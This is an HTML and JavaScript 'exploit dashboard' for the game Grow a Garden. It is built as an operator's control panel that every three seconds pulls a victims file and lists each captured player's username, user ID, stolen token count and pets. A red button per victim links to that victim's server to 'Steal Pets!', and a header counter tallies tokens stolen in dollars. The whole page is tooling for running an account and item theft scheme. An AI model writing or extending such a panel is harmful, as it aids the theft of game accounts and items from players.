<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Padmaraj1234 - Grow a Garden Dashboard</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #0a0a0a;
            color: #00ff00;
            font-family: 'Courier New', monospace;
            padding: 20px;
        }
        .header {
            text-align: center;
            margin-bottom: 30px;
            font-size: 24px;
        }
        .stats {
            display: flex;
            gap: 20px;
            margin-bottom: 30px;
            font-size: 18px;
        }
        .victim {
            background: rgba(0,255,0,0.1);
            border: 2px solid #00ff00;
            border-radius: 8px;
            padding: 20px;
            margin-bottom: 20px;
        }
        .server-btn {
            background: #ff0000 !important;
            color: white !important;
            padding: 12px 24px !important;
            text-decoration: none !important;
            border-radius: 5px !important;
            font-weight: bold !important;
            display: inline-block !important;
            margin-top: 10px;
        }
        .pets {
            background: rgba(0,0,0,0.5);
            padding: 10px;
            border-radius: 5px;
            margin-top: 10px;
            font-size: 14px;
        }
        .tokens { font-size: 24px; color: #ffd700; font-weight: bold; }
    </style>
</head>
<body>
    <div class="header">
        <h1>🟢 GROW A GARDEN EXPLOIT DASHBOARD</h1>
        <h2>Padmaraj1234's Control Panel</h2>
    </div>
    
    <div class="stats">
        <div>Total Victims: <span id="totalVictims">0</span></div>
        <div>Live Servers: <span id="liveServers">0</span></div>
        <div>Tokens Stolen: $<span id="totalTokens">0</span></div>
    </div>
    
    <div id="victimsList"></div>

    <script>
        let victims = [];
        
        // Simulate API endpoint (replace with real backend)
        const API_URL = 'https://httpbin.org/post'; // Your real endpoint here
        
        // Auto-refresh every 3 seconds
        setInterval(updateDashboard, 3000);
        updateDashboard();
        
        async function updateDashboard() {
            // Fetch victims data (your server endpoint)
            try {
                // Simulate data fetch - replace with your API
                const response = await fetch('victims.json?t=' + Date.now());
                victims = await response.json();
                renderVictims();
            } catch(e) {
                console.log('Fetching data...');
            }
        }
        
        function renderVictims() {
            const container = document.getElementById('victimsList');
            container.innerHTML = victims.map((v, i) => `
                <div class="victim">
                    <h3>🎯 VICTIM #${i+1}: ${v.username}</h3>
                    <div class="tokens">${v.tokens.toLocaleString()} TOKENS</div>
                    <div>UserID: ${v.userId}</div>
                    <div>Captured: ${new Date(v.timestamp * 1000).toLocaleString()}</div>
                    
                    <a href="${v.serverLink}" class="server-btn" target="_blank">
                        🚀 JOIN SERVER NOW (Steal Pets!)
                    </a>
                    
                    <div class="pets">
                        <strong>Pets (${v.pets.length}):</strong><br>
                        ${v.pets.join(', ')}
                    </div>
                </div>
            `).join('');
            
            // Update stats
            document.getElementById('totalVictims').textContent = victims.length;
            document.getElementById('totalTokens').textContent = 
                victims.reduce((sum, v) => sum + v.tokens, 0).toLocaleString();
        }
    </script>
</body>
</html>
